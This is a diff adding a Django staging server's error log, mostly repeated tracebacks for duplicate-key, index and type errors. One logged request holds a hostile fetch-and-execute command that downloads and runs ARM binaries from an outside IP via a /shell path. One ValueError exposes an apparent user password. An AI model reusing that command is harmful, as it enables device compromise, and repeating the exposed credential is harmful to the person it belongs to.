+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/travel/views.py", line 247, in post
+    travel_id=serializer.save().travel_req_id
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/serializers.py", line 214, in save
+    self.instance = self.create(validated_data)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/serializers.py", line 943, in create
+    instance = ModelClass._default_manager.create(**validated_data)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 413, in create
+    obj.save(force_insert=True, using=self.db)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 717, in save
+    force_update=force_update, update_fields=update_fields)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 747, in save_base
+    updated = self._save_table(raw, cls, force_insert, force_update, using, update_fields)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 830, in _save_table
+    result = self._do_insert(cls._base_manager, using, fields, update_pk, raw)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 868, in _do_insert
+    using=using, raw=raw)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 1133, in _insert
+    return query.get_compiler(using=using).execute_sql(return_id)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/sql/compiler.py", line 1285, in execute_sql
+    cursor.execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 100, in execute
+    return super().execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 68, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 77, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/utils.py", line 89, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+django.db.utils.IntegrityError: duplicate key value violates unique constraint "travel_travel_request_pkey"
+DETAIL:  Key (id)=(23) already exists.
+
+ERROR|18/May/2021 15:46:07|basehttp|690629|139746154133248|"POST /get_add/travel_request/ HTTP/1.1" 500 22932
+ERROR|18/May/2021 15:58:49|log|690629|139746154133248|Internal Server Error: /get_add/travel_request/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+psycopg2.errors.UniqueViolation: duplicate key value violates unique constraint "travel_travel_request_details_pkey"
+DETAIL:  Key (id)=(1) already exists.
+
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/travel/views.py", line 307, in post
+    travel_request_detail.save()
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/serializers.py", line 214, in save
+    self.instance = self.create(validated_data)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/serializers.py", line 943, in create
+    instance = ModelClass._default_manager.create(**validated_data)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 413, in create
+    obj.save(force_insert=True, using=self.db)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 717, in save
+    force_update=force_update, update_fields=update_fields)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 747, in save_base
+    updated = self._save_table(raw, cls, force_insert, force_update, using, update_fields)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 830, in _save_table
+    result = self._do_insert(cls._base_manager, using, fields, update_pk, raw)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 868, in _do_insert
+    using=using, raw=raw)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 1133, in _insert
+    return query.get_compiler(using=using).execute_sql(return_id)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/sql/compiler.py", line 1285, in execute_sql
+    cursor.execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 100, in execute
+    return super().execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 68, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 77, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/utils.py", line 89, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+django.db.utils.IntegrityError: duplicate key value violates unique constraint "travel_travel_request_details_pkey"
+DETAIL:  Key (id)=(1) already exists.
+
+ERROR|18/May/2021 15:58:49|basehttp|690629|139746154133248|"POST /get_add/travel_request/ HTTP/1.1" 500 22944
+ERROR|18/May/2021 16:21:19|log|690629|139746145740544|Internal Server Error: /get_national_id/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+psycopg2.errors.UniqueViolation: duplicate key value violates unique constraint "master_national_id_pkey"
+DETAIL:  Key (id)=(1) already exists.
+
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/master/views/country.py", line 659, in post
+    serializer.save()
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/serializers.py", line 214, in save
+    self.instance = self.create(validated_data)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/serializers.py", line 943, in create
+    instance = ModelClass._default_manager.create(**validated_data)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 413, in create
+    obj.save(force_insert=True, using=self.db)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 717, in save
+    force_update=force_update, update_fields=update_fields)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 747, in save_base
+    updated = self._save_table(raw, cls, force_insert, force_update, using, update_fields)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 830, in _save_table
+    result = self._do_insert(cls._base_manager, using, fields, update_pk, raw)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 868, in _do_insert
+    using=using, raw=raw)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 1133, in _insert
+    return query.get_compiler(using=using).execute_sql(return_id)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/sql/compiler.py", line 1285, in execute_sql
+    cursor.execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 100, in execute
+    return super().execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 68, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 77, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/utils.py", line 89, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+django.db.utils.IntegrityError: duplicate key value violates unique constraint "master_national_id_pkey"
+DETAIL:  Key (id)=(1) already exists.
+
+ERROR|18/May/2021 16:21:19|basehttp|690629|139746145740544|"POST /get_national_id/ HTTP/1.1" 500 22867
+ERROR|18/May/2021 16:41:01|basehttp|690629|139746150725376|"GET /config/getuser?index=0 HTTP/1.1" 500 59
+ERROR|18/May/2021 16:50:41|log|690629|139745870993152|Internal Server Error: /emoloyeeinfo/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/employee/views.py", line 86, in post
+    if not employees_recent[0]['last_login']:
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 303, in __getitem__
+    return qs._result_cache[0]
+IndexError: list index out of range
+ERROR|18/May/2021 16:50:41|basehttp|690629|139745870993152|"POST /emoloyeeinfo/ HTTP/1.1" 500 18858
+ERROR|18/May/2021 16:54:48|log|697923|140574078764800|Internal Server Error: /emoloyeeinfo/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/employee/views.py", line 87, in post
+    if not employees_recent[0]['last_login']:
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 303, in __getitem__
+    return qs._result_cache[0]
+IndexError: list index out of range
+ERROR|18/May/2021 16:54:48|basehttp|697923|140574078764800|"POST /emoloyeeinfo/ HTTP/1.1" 500 18858
+ERROR|18/May/2021 17:01:43|log|698638|140513772578560|Internal Server Error: /emoloyeeinfo/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/employee/views.py", line 98, in post
+    if employees[0]['active_start_date']:
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 303, in __getitem__
+    return qs._result_cache[0]
+IndexError: list index out of range
+ERROR|18/May/2021 17:01:43|basehttp|698638|140513772578560|"POST /emoloyeeinfo/ HTTP/1.1" 500 18854
+ERROR|18/May/2021 18:22:50|log|699018|139768002758400|Internal Server Error: /access_token/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/employee/views.py", line 1957, in post
+    otp=User.objects.filter(otp=otp).values("id")
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 841, in filter
+    return self._filter_or_exclude(False, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 859, in _filter_or_exclude
+    clone.query.add_q(Q(*args, **kwargs))
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/sql/query.py", line 1263, in add_q
+    clause, _ = self._add_q(q_object, self.used_aliases)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/sql/query.py", line 1287, in _add_q
+    split_subq=split_subq,
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/sql/query.py", line 1225, in build_filter
+    condition = self.build_lookup(lookups, col, value)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/sql/query.py", line 1096, in build_lookup
+    lookup = lookup_class(lhs, rhs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/lookups.py", line 20, in __init__
+    self.rhs = self.get_prep_lookup()
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/lookups.py", line 70, in get_prep_lookup
+    return self.lhs.output_field.get_prep_value(self.rhs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/fields/__init__.py", line 1807, in get_prep_value
+    return int(value)
+ValueError: invalid literal for int() with base 10: 'Divyanshu@94'
+ERROR|18/May/2021 18:22:50|basehttp|699018|139768002758400|"POST /access_token/ HTTP/1.1" 500 20499
+ERROR|18/May/2021 18:29:14|exception|699018|139767994365696|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|18/May/2021 19:49:18|basehttp|699018|139767994365696|"GET /config/getuser?index=0 HTTP/1.1" 500 59
+ERROR|18/May/2021 21:46:14|basehttp|699018|139767994365696|You're accessing the development server over HTTPS, but it only supports HTTP.
+
+ERROR|18/May/2021 22:33:49|exception|699018|139767994365696|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|19/May/2021 02:59:21|exception|699018|139767994365696|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|19/May/2021 05:20:46|basehttp|699018|139767994365696|"GET /shell?cd+/tmp;rm+arm+arm7;wget+http:/\/45.14.149.244/arm7;chmod+777+arm7;./arm7+jaws;wget+http:/\/45.14.149.244/arm;chmod+777+arm;./arm+starcam HTTP/1.1" 500 59
+ERROR|19/May/2021 06:41:36|exception|699018|139767994365696|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|19/May/2021 06:41:36|basehttp|699018|139767994365696|"GET /manager/html HTTP/1.1" 500 59
+ERROR|19/May/2021 09:50:07|basehttp|699018|139767756875520|"GET /config/getuser?index=0 HTTP/1.1" 500 59
+ERROR|19/May/2021 10:33:49|exception|699018|139767756875520|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|19/May/2021 11:18:07|basehttp|699018|139768002758400|"GET /config/getuser?index=0 HTTP/1.1" 500 59
+ERROR|19/May/2021 11:27:14|log|699018|139768002758400|Internal Server Error: /employee_chat/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/employee/views.py", line 2774, in post
+    thread_data = sender_emp_code + receiver_emp_code
+TypeError: must be str, not NoneType
+ERROR|19/May/2021 11:27:14|basehttp|699018|139768002758400|"POST /employee_chat/ HTTP/1.1" 500 18634
+ERROR|19/May/2021 11:27:28|log|699018|139768002758400|Internal Server Error: /employee_chat/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
